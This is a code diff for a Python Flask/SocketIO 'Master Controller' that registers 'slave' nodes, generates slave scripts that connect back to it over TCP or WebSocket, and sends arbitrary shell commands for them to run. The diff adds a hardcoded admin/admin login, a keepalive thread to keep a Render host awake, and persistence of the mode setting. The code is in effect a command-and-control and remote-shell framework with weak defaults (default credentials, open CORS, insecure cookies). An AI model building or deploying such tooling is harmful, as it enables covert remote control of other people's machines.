@@ -2,7 +2,8 @@
 """
 Master Controller – CyberOps Edition
 Dual‑mode: VPS (TCP) + Render (WebSocket) with toggle.
-Real‑time slave management, command dispatch, live dashboard.
+Login required (admin/admin) with mode selection.
+Keep‑alive thread prevents Render from sleeping.
 """
 
 import socket
@@ -14,8 +15,9 @@ import json
 import os
 import hashlib
 import secrets
+import requests
 from datetime import datetime
-from flask import Flask, render_template_string, jsonify, request
+from flask import Flask, render_template_string, jsonify, request, redirect, session, url_for
 from flask_socketio import SocketIO, emit, disconnect
 
 # ========== CONFIGURATION ==========
@@ -24,13 +26,19 @@ WEB_HOST     = os.environ.get('MASTER_WEB_HOST', '0.0.0.0')
 WEB_PORT     = int(os.environ.get('MASTER_WEB_PORT', '5000'))
 DB_FILE      = os.environ.get('MASTER_DB_FILE', 'slaves.json')
 MASTER_IP    = os.environ.get('MASTER_IP', '192.168.0.1')   # for VPS mode
-# Render mode uses the same hostname (e.g., app.onrender.com) – we derive from request.
+MODE_FILE    = 'mode.txt'                                   # persists current mode
 # ====================================
 
 # Global mode: 'vps' or 'render'
-CURRENT_MODE = os.environ.get('MASTER_MODE', 'vps').lower()
-if CURRENT_MODE not in ('vps', 'render'):
-    CURRENT_MODE = 'vps'
+CURRENT_MODE = 'vps'
+if os.path.exists(MODE_FILE):
+    try:
+        with open(MODE_FILE, 'r') as f:
+            CURRENT_MODE = f.read().strip().lower()
+        if CURRENT_MODE not in ('vps', 'render'):
+            CURRENT_MODE = 'vps'
+    except:
+        CURRENT_MODE = 'vps'
 
 slaves        = {}   # slave_id -> metadata dict
 active_tcp    = {}   # slave_id -> socket
@@ -76,6 +84,15 @@ def save_slaves():
     except Exception as e:
         log_event(f"DB save error: {e}")
 
+def save_mode(mode: str):
+    global CURRENT_MODE
+    CURRENT_MODE = mode
+    try:
+        with open(MODE_FILE, 'w') as f:
+            f.write(mode)
+    except Exception as e:
+        log_event(f"Mode save error: {e}")
+
 # ========== TCP SERVER (VPS mode) ==========
 def recv_exact(sock, n):
     buf = b''
@@ -119,11 +136,9 @@ def handle_tcp_slave(client_sock, addr):
                 client_sock.close()
                 log_event(f"REJECTED unknown ID {slave_id} from {addr[0]}")
                 return
-            # Remove from any other active protocol
             active_tcp[slave_id] = client_sock
             if slave_id in active_ws:
                 del active_ws[slave_id]
-            # Mark protocol
             slaves[slave_id]['protocol'] = 'tcp'
             slaves[slave_id]['last_seen']   = time.time()
             slaves[slave_id]['ip']          = addr[0]
@@ -134,7 +149,6 @@ def handle_tcp_slave(client_sock, addr):
         client_sock.sendall(b"REG_OK")
         log_event(f"NODE ONLINE  (TCP) [{name}] {slave_id[:8]} — {addr[0]}")
 
-        # Receive profile
         try:
             len_raw = recv_exact(client_sock, 4)
             if len_raw:
@@ -148,7 +162,6 @@ def handle_tcp_slave(client_sock, addr):
         except Exception as e:
             log_event(f"PROFILE RECEIVE ERROR (TCP) [{name}]: {e}")
 
-        # Heartbeat sender
         def heartbeat_sender():
             while slave_id in active_tcp:
                 time.sleep(30)
@@ -158,7 +171,6 @@ def handle_tcp_slave(client_sock, addr):
                     break
         threading.Thread(target=heartbeat_sender, daemon=True).start()
 
-        # Keep-alive
         while True:
             peek = client_sock.recv(1, socket.MSG_PEEK)
             if peek == b'':
@@ -174,7 +186,6 @@ def handle_tcp_slave(client_sock, addr):
             if slave_id and slave_id in slaves:
                 slaves[slave_id]['last_seen'] = time.time()
                 slaves[slave_id]['ip']         = None
-                # Remove protocol if offline? We'll keep it for reference.
                 name = slaves[slave_id]['name']
                 save_slaves()
         log_event(f"NODE OFFLINE (TCP) [{name}] {slave_id[:8] if slave_id else '?'}")
@@ -197,9 +208,6 @@ def tcp_server_loop():
             break
 
 # ========== WebSocket (Render mode) ==========
-# We will use Flask-SocketIO; the SocketIO instance is created after app.
-# Events are defined below.
-
 # ========== COMMAND EXECUTION (dual) ==========
 def execute_command(slave_id: str, command: str) -> str:
     with slaves_lock:
@@ -207,9 +215,8 @@ def execute_command(slave_id: str, command: str) -> str:
         if not info:
             return f"ERROR: unknown slave '{slave_id}'"
         name = info.get('name', slave_id[:8])
-        protocol = info.get('protocol', None)  # 'tcp' or 'ws'
+        protocol = info.get('protocol', None)
 
-    # Try TCP first if protocol is tcp or unknown
     if protocol != 'ws':
         sock = active_tcp.get(slave_id)
         if sock:
@@ -238,36 +245,26 @@ def execute_command(slave_id: str, command: str) -> str:
                 log_event(f"CMD (TCP) [{name}] » {command[:60]}")
                 return output
             except Exception as e:
-                # If TCP fails, we might fallback to WS? But we'll handle separately.
-                # Mark offline
                 with slaves_lock:
                     if slave_id in active_tcp:
                         del active_tcp[slave_id]
                     if slave_id in slaves:
                         slaves[slave_id]['ip'] = None
-                        slaves[slave_id]['protocol'] = None  # will re-detect
+                        slaves[slave_id]['protocol'] = None
                         save_slaves()
                 log_event(f"COMM ERROR (TCP) [{name}]: {e}")
-                # Continue to try WebSocket if possible
-                # But we'll not fallback automatically; we'll try WS if protocol was ws or if we want.
-                # Since we already tried TCP, we'll now try WS if protocol is 'ws' or if we have WS active.
-        # If no TCP socket, try WebSocket
-    # Try WebSocket
+
     ws_sid = active_ws.get(slave_id)
     if ws_sid:
-        # We need to send command via SocketIO and wait for response.
-        # Use a callback mechanism with threading.Event.
         import threading
         event = threading.Event()
         result = [None]
-        error = [None]
         cmd_id = str(uuid.uuid4())
 
         def callback(data):
             result[0] = data.get('output', '')
             event.set()
 
-        # Store callback in a global dict
         global pending_ws_commands
         pending_ws_commands[cmd_id] = callback
 
@@ -281,7 +278,6 @@ def execute_command(slave_id: str, command: str) -> str:
                 raise TimeoutError("WebSocket command timeout")
         except Exception as e:
             log_event(f"COMM ERROR (WS) [{name}]: {e}")
-            # Mark offline
             with slaves_lock:
                 if slave_id in active_ws:
                     del active_ws[slave_id]
@@ -295,18 +291,97 @@ def execute_command(slave_id: str, command: str) -> str:
     else:
         return f"ERROR: node '{name}' is offline (no connection)"
 
-# Global pending commands for WebSocket responses
 pending_ws_commands = {}
 
 # ========== FLASK & SOCKETIO ==========
 app = Flask(__name__)
 app.config['SECRET_KEY'] = secrets.token_hex(16)
+app.config['SESSION_COOKIE_SECURE'] = False  # set to True if using HTTPS
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
+
+# ========== KEEPALIVE ==========
+def keepalive_loop():
+    """Ping the app every 5 minutes to prevent Render from sleeping."""
+    while True:
+        time.sleep(300)  # 5 minutes
+        try:
+            requests.get(f"http://localhost:{WEB_PORT}/keepalive", timeout=5)
+        except Exception:
+            pass
+
+# ========== LOGIN / AUTH ==========
+LOGIN_HTML = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Master Controller – Login</title>
+    <style>
+        body { background: #080b10; color: #c8d6e5; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: #0c1018; padding: 40px; border-radius: 8px; border: 1px solid #1e2838; width: 340px; }
+        h1 { font-family: 'JetBrains Mono', monospace; font-size: 18px; letter-spacing: 2px; color: #00c8d4; text-align: center; margin-bottom: 20px; }
+        label { display: block; margin-top: 12px; font-size: 12px; color: #8899aa; text-transform: uppercase; letter-spacing: 1px; }
+        input[type="text"], input[type="password"] {
+            width: 100%; padding: 10px; background: #111620; border: 1px solid #1e2838; border-radius: 4px; color: #c8d6e5; font-size: 14px; box-sizing: border-box;
+        }
+        input:focus { border-color: #00c8d4; outline: none; }
+        .mode-radio { display: flex; gap: 20px; margin-top: 8px; }
+        .mode-radio label { margin-top: 0; display: inline; }
+        button { width: 100%; padding: 12px; background: #00c8d4; border: none; border-radius: 4px; color: #000; font-weight: 600; font-size: 14px; margin-top: 20px; cursor: pointer; }
+        button:hover { background: #00e5f0; }
+        .error { color: #ff3d57; font-size: 12px; margin-top: 10px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h1>⛅ MASTER CONTROLLER</h1>
+        <form method="POST" action="/login">
+            <label>Username</label>
+            <input type="text" name="username" value="admin" required>
+            <label>Password</label>
+            <input type="password" name="password" value="admin" required>
+            <label>Deployment Mode</label>
+            <div class="mode-radio">
+                <label><input type="radio" name="mode" value="vps" checked> VPS (TCP)</label>
+                <label><input type="radio" name="mode" value="render"> Render (WS)</label>
+            </div>
+            <button type="submit">▶ CONNECT</button>
+            {% if error %}
+                <div class="error">{{ error }}</div>
+            {% endif %}
+        </form>
+    </div>
+</body>
+</html>
+"""
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form.get('username', '').strip()
+        password = request.form.get('password', '').strip()
+        mode = request.form.get('mode', 'vps').strip().lower()
+        if username == 'admin' and password == 'admin':
+            session['logged_in'] = True
+            session['mode'] = mode
+            save_mode(mode)
+            return redirect(url_for('index'))
+        else:
+            return render_template_string(LOGIN_HTML, error='Invalid credentials')
+    return render_template_string(LOGIN_HTML, error=None)
+
+@app.before_request
+def require_login():
+    if request.endpoint and request.endpoint not in ('login', 'static', 'keepalive'):
+        if not session.get('logged_in'):
+            return redirect(url_for('login'))
+
+@app.route('/keepalive')
+def keepalive():
+    return "ok", 200
 
 # ========== SOCKETIO EVENTS ==========
 @socketio.on('connect')
 def handle_connect():
-    # We'll register later via 'register' event
     pass
 
 @socketio.on('register')
@@ -320,24 +395,12 @@ def handle_register(data):
         if slave_id not in slaves:
             emit('registered', {'status': 'error', 'msg': 'Unknown slave ID'})
             return
-        # Check if already connected via TCP; if so, we might allow both? We'll only keep one.
-        # For simplicity, we'll mark this as WS and remove TCP if present.
-        if slave_id in active_tcp:
-            # Optionally close TCP connection? We'll just keep both but protocol will be ws.
-            # We'll set protocol to ws and remove from active_tcp? Better to keep both but
-            # for command execution we prefer WS if protocol is ws.
-            pass
         active_ws[slave_id] = request.sid
-        if slave_id in active_tcp:
-            # We'll keep both, but mark protocol as ws.
-            pass
         slaves[slave_id]['protocol'] = 'ws'
         slaves[slave_id]['last_seen'] = time.time()
-        # IP is not directly available via SocketIO; we can get from request
         slaves[slave_id]['ip'] = request.remote_addr
         slaves[slave_id]['connect_time'] = time.time()
         name = slaves[slave_id]['name']
-        # Update profile if provided
         if 'profile' in data:
             slaves[slave_id].update(data['profile'])
         save_slaves()
@@ -355,12 +418,10 @@ def handle_command_response(data):
 
 @socketio.on('disconnect')
 def handle_disconnect():
-    # Find which slave_id corresponds to this sid
     with slaves_lock:
         for sid, ws_sid in list(active_ws.items()):
             if ws_sid == request.sid:
                 slave_id = sid
-                # Mark offline
                 if slave_id in slaves:
                     slaves[slave_id]['last_seen'] = time.time()
                     slaves[slave_id]['ip'] = None
@@ -371,7 +432,7 @@ def handle_disconnect():
                 log_event(f"NODE OFFLINE (WS) [{name}] {slave_id[:8]}")
                 break
 
-# ========== HTML (same as before, but with mode toggle) ==========
+# ========== HTML DASHBOARD (with mode toggle) ==========
 HTML = r"""<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -502,6 +563,17 @@ HTML = r"""<!DOCTYPE html>
   .mode-toggle .mode-btn:not(.active):hover {
     background: var(--bg3);
   }
+  .logout-btn {
+    background: transparent;
+    border: 1px solid var(--border2);
+    color: var(--text2);
+    padding: 4px 12px;
+    border-radius: 4px;
+    font-family: var(--mono);
+    font-size: 10px;
+    cursor: pointer;
+  }
+  .logout-btn:hover { border-color: var(--red); color: var(--red); }
 
   /* ---- LAYOUT ---- */
   #layout {
@@ -885,6 +957,7 @@ HTML = r"""<!DOCTYPE html>
       <button class="mode-btn" id="mode-vps" onclick="setMode('vps')">VPS</button>
       <button class="mode-btn" id="mode-render" onclick="setMode('render')">Render</button>
     </div>
+    <button class="logout-btn" onclick="location.href='/logout'">⏻ Logout</button>
     <div id="clock"></div>
   </div>
 </div>
@@ -1095,10 +1168,7 @@ async function setMode(mode) {
       document.getElementById('mode-vps').classList.toggle('active', mode === 'vps');
       document.getElementById('mode-render').classList.toggle('active', mode === 'render');
       toast('Mode switched to ' + mode.toUpperCase());
-      // Update script preview protocol if a script is pending
       if (pendingScript) {
-        // Re-generate script to reflect new mode? We'll do that on next create.
-        // For now just show current mode in meta.
         document.getElementById('smeta-protocol').textContent = mode.toUpperCase();
       }
     } else {
@@ -1435,6 +1505,11 @@ fetchMode();
 def index():
     return HTML
 
+@app.route('/logout')
+def logout():
+    session.clear()
+    return redirect(url_for('login'))
+
 @app.route('/api/slaves')
 def api_slaves():
     with slaves_lock:
@@ -1462,7 +1537,7 @@ def api_mode():
         new_mode = data.get('mode', '').lower()
         if new_mode not in ('vps', 'render'):
             return jsonify({'error': 'Invalid mode, must be "vps" or "render"'}), 400
-        CURRENT_MODE = new_mode
+        save_mode(new_mode)
         log_event(f"Mode switched to {CURRENT_MODE.upper()}")
         return jsonify({'status': 'ok', 'mode': CURRENT_MODE})
 
@@ -1482,11 +1557,10 @@ def api_create_slave():
                 'created_at': time.time(),
                 'last_seen':  None,
                 'ip':         None,
-                'protocol':   None,  # Will be set when connects
+                'protocol':   None,
             }
         save_slaves()
 
-        # Generate script using current mode
         script = generate_slave_script(new_id, name)
         filename = save_slave_script(new_id, name, script)
         return jsonify({'slave_id': new_id, 'name': name, 'script': script, 'filename': filename, 'mode': CURRENT_MODE})
@@ -1503,7 +1577,6 @@ def api_get_script(slave_id):
         info = slaves.get(slave_id)
     if not info:
         return jsonify({'error': 'Node not found'}), 404
-    # Use current mode for script generation, but we could also use stored protocol? We'll use current mode.
     script   = generate_slave_script(slave_id, info['name'])
     filename = save_slave_script(slave_id, info['name'], script)
     return jsonify({'script': script, 'filename': filename, 'name': info['name'], 'slave_id': slave_id, 'mode': CURRENT_MODE})
@@ -1525,7 +1598,6 @@ def api_logs():
 
 # ========== GENERATE SLAVE SCRIPT (dual mode) ==========
 def generate_slave_script(slave_id: str, slave_name: str) -> str:
-    # Choose protocol based on current mode
     if CURRENT_MODE == 'vps':
         return generate_tcp_slave_script(slave_id, slave_name)
     else:
@@ -1762,10 +1834,7 @@ if __name__ == "__main__":
 '''
 
 def generate_ws_slave_script(slave_id: str, slave_name: str) -> str:
-    # Use the same master IP but for WebSocket we use the full URL (https://...)
-    # We'll use MASTER_IP as the hostname, but we need to include protocol.
     master_url = f"https://{MASTER_IP}" if not MASTER_IP.startswith('http') else MASTER_IP
-    # For Render, the port is 443 (https) or 80 (http) – we'll just use the host.
     return f'''#!/usr/bin/env python3
 # =============================================
 #  Slave Node (Render/WebSocket) — {slave_name}
@@ -1880,10 +1949,6 @@ def command(data):
     command_str = data.get('command', '')
     print(f"[>] Executing: {{command_str}}")
     output = run_command(command_str)
-    # Encrypt output? For WebSocket we can send plaintext, but we'll keep it simple.
-    # We'll send the output as is (could be encrypted if needed)
-    # For consistency with TCP, we could encrypt, but WebSocket is already over TLS.
-    # We'll just send plain text.
     sio.emit('command_response', {{
         'id': cmd_id,
         'output': output.decode('utf-8', errors='replace')
@@ -2005,5 +2070,6 @@ if __name__ == '__main__':
     print("=" * 52)
     load_slaves()
     threading.Thread(target=tcp_server_loop, daemon=True).start()
-    # Start SocketIO with eventlet
+    # Start keepalive thread
+    threading.Thread(target=keepalive_loop, daemon=True).start()
     socketio.run(app, host=WEB_HOST, port=WEB_PORT, debug=False, use_reloader=False)
